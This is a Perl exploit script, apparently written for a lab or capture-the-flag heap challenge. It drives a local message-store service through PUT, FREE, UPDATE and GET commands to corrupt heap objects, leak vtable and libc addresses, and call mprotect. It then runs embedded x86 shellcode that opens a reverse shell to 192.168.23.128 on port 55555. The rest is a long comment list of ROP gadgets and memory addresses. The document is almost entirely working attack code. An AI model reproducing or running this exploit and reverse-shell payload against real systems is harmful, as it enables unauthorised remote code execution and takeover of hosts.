#!/usr/bin/perl -w

use IO::Socket;

my $buf;
my $sock = IO::Socket::INET->new("127.0.0.1:5555") or die $@;
$sock->autoflush(1);

my $sc = "\x68".
"\xC0\xA8\x17\x80".  # 192.168.23.128
"\x5e\x66\x68".
"\xd9\x03".          # 55555
"\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xce";

print $sock "PUT\n";
print $sock "id01\n";
print $sock "AAAA\n";

print $sock "FREE\n";
print $sock "id01\n";

print $sock "PUT\n";
print $sock "id02"x4 . "\n";
print $sock "B"x16 . "\n";

print $sock "PUT\n";
print $sock "id03"x4 . "\n";
print $sock "C"x16 . "\n";

print $sock "PUT\n";
print $sock "id04\n";
print $sock "DDDD\n";

print $sock "FREE\n";
print $sock "id04\n";

print $sock "PUT\n";
print $sock "id04" . "\n";
print $sock "D"x16 . "\n";

print $sock "PUT\n";
print $sock "id05"x4 . "\n";
print $sock $sc . "\n";

print $sock "UPDATE\n";
print $sock "id02"x4 . "\n";
print $sock "A"x52 . "\x90" . "\n";

my $v_table;
my $size;
my $str_addr;
my $id_addr;
print $sock "GET\n";
print $sock "id03"x4 . "\n";
# skip
read($sock,$buf, 16*8);

# vtable
read($sock, $v_table, 4);
$v_table = unpack("L", $v_table);
printf "Virtual table:\t%x\n", $v_table;

# size str
read($sock, $size, 4);
$size = unpack("L", $size);
printf "Size str:\t%x\n", $size;

# str
read($sock, $str_addr, 4);
$str_addr = unpack("L", $str_addr);
printf "Str address:\t%x\n", $str_addr;

# id
read($sock, $id_addr, 4);
$id_addr = unpack("L", $id_addr);
printf "Id address:\t%x\n", $id_addr;

# update to *(vtable+8) 
print $sock "UPDATE\n";
print $sock "A"x28 . "\x90" . "\n";
print $sock "A"x52 . "\x10\x01\x01\x01" . pack("L", $v_table) . "\n";

# skip nulls
print $sock "UPDATE\n";
print $sock "A"x28 . "\x10\x01\x01\x01" . pack("L", $v_table) . "\n";
print $sock "A"x52 . "\x10\x01\x01" . "\n";
print $sock "UPDATE\n";
print $sock "A"x28 . "\x10\x01\x01" . "\n";
print $sock "A"x52 . "\x10\x01" . "\n";
print $sock "UPDATE\n";
print $sock "A"x28 . "\x10\x01" . "\n";
print $sock "A"x52 . "\x10" . "\n";

my $libc_position;
print $sock "GET\n";
print $sock "\x00" . "\n";
# skip
read($sock,$buf, 13);

read($sock,$libc_position, 4);
$libc_position = unpack("L", $libc_position);
printf "Libc pos:\t%x\n", $libc_position;

print $sock "UPDATE\n";
print $sock "id04\n";
#print $sock "E"x24 . pack("L", $str_addr - 0x18) . "\x48" . "\n";
print $sock "E"x24 . pack("L", $str_addr - 0x18) . "A"x4 . pack("L", $libc_position - 0x0010E572) . pack("L", $str_addr + 0x50) . "\n";
# 0xb7eb26d6

# open shell
print $sock "UPDATE\n";
print $sock "id05"x4 . "\n";
print $sock pack("L", $libc_position - 0x001b5bd8) . pack("L", $str_addr) . pack("L", $str_addr & 0xFFFFF000) . pack("L", 0x00001000) . pack("L", 0x00000007) . "\n";

# _Z16TInsertListEntryPKcS0_
# 0x08048d3d - end

# table
# 0x080491c8

# update
# _ZN8TMessage6UpdateEPKc
# 0x080490D6 - start
# 0x080490f3 - end

# free
# _ZN8TMessageD2Ev

# address mprotect (no aslr)
# 0xb7e0d070

# heov
# 0x0804b000

# 0x10259f

# call eax
# 0x08048f43


# 0xb7e3cee0
# 0x00103eda : adc byte ptr [ebx + 0x4508b06], cl ; mov dword ptr [esp], eax ; call dword ptr [edx + 0x10]

# 0x000fe5a9 : add byte ptr [eax], al ; mov dword ptr [edx + 4], ecx ; pop ebx ; pop ebp ; ret

# 0x000fe5d0 : add byte ptr [eax], al ; mov dword ptr [edx + 8], ecx ; pop ebx ; pop ebp ; ret

# 0x0010400c : add byte ptr [eax], al ; mov dword ptr [esp], eax ; call dword ptr [edx + 0x14]
# 0x0006e535 : add byte ptr [eax], al ; mov dword ptr [esp], eax ; call dword ptr [edx + 0x24]
# 0x00067232 : add byte ptr [eax], al ; mov dword ptr [esp], eax ; call dword ptr [edx + 0x30]
# 0x0010e68e : add byte ptr [eax], al ; mov dword ptr [esp], eax ; call dword ptr [edx + 0x7f4]

# 0x00067c9e : add byte ptr [ecx - 0x76fbdbbc], cl ; xor al, 0x24 ; call dword ptr [edx + 0x18]
# 0x0000870f : add byte ptr [ecx], dl ; add cl, dh ; call dword ptr [edx + 0x50]
# 0x00009bdf : add byte ptr [ecx], dl ; add cl, dh ; call dword ptr [edx + 7]

# 0x00127a95 : add byte ptr [edi], cl ; test dword ptr [edx + 1], edi ; add byte ptr [eax], al ; pop ebx ; ret

# 0xb7e90ba9
# 0x00157ba9 : mov esp, edx ; clc ; jmp dword ptr [edx]

# 0x0006a027 : sub eax, edx ; mov dword ptr [esp + 8], eax ; mov edx, dword ptr [ebp - 0x2c] ; call dword ptr [edx + 0x38]

# 0x000643c1 : xor eax, eax ; mov ebp, esp ; pop ebp ; ret

# 0x00101c43 : inc esp ; and al, 4 ; mov edx, dword ptr [ebp + 8] ; mov dword ptr [esp], edx ; call dword ptr [ebp + 0x18]

# 0x000ec5a9 : mov esi, dword ptr [ecx + 4] ; mov edi, dword ptr [ecx + 8] ; mov ebp, dword ptr [ecx + 0xc] ; jmp edx

# 0xb7dd5478
# 0x0009c476 : add eax, dword ptr [edx] ; mov esi, dword ptr [esp] ; mov esp, ebp ; pop ebp ; ret



# 0xb7eb46d6 \x89\xCC\xC3
# 0x000166cf : clc ; mov edi, dword ptr [ebp - 4] ; mov ebp, dword ptr [ebp] ; mov esp, ecx ; ret


# 0xb7fff2ac

# default main
# 0x08049022

# static mprotect
# 0xb7e0d070


# 0xb7806790 t
# 

# 0xb8000790 t
# 0xb7e0b070 m

# 0x080491c3 t
# 0xb7e0d070 m


# static
# 0x0804a648
# _ZTVN10__cxxabiv117__class_type_infoE
# 0xb7fc23c0 - 0xb7fc591c is .data.rel.ro in /usr/lib/i386-linux-gnu/libstdc++.so.6

# libc.so.6
# 0xb7e0d070 mprotect
# 0xb7eb46d6 gadget
# 0xb7d39174 - 0xb7d39198 is .note.gnu.build-id in /lib/i386-linux-gnu/i686/cmov/libc.so.6
# 0xb7e9a9a0 - 0xb7e9d978 is .bss in /lib/i386-linux-gnu/i686/cmov/libc.so.6
# 0x0804A648

# example dynamic
# 0xb7e0b070 mprotect
# 0xb7eb26d6 gadget
# 0xb7d37174 - 0xb7d37198 is .note.gnu.build-id in /lib/i386-linux-gnu/i686/cmov/libc.so.6
# 0xb7e989a0 - 0xb7e9b978 is .bss in /lib/i386-linux-gnu/i686/cmov/libc.so.6
# 0xb7fc0c48

# 0x001b5bd8 m
# 0x0010E572 g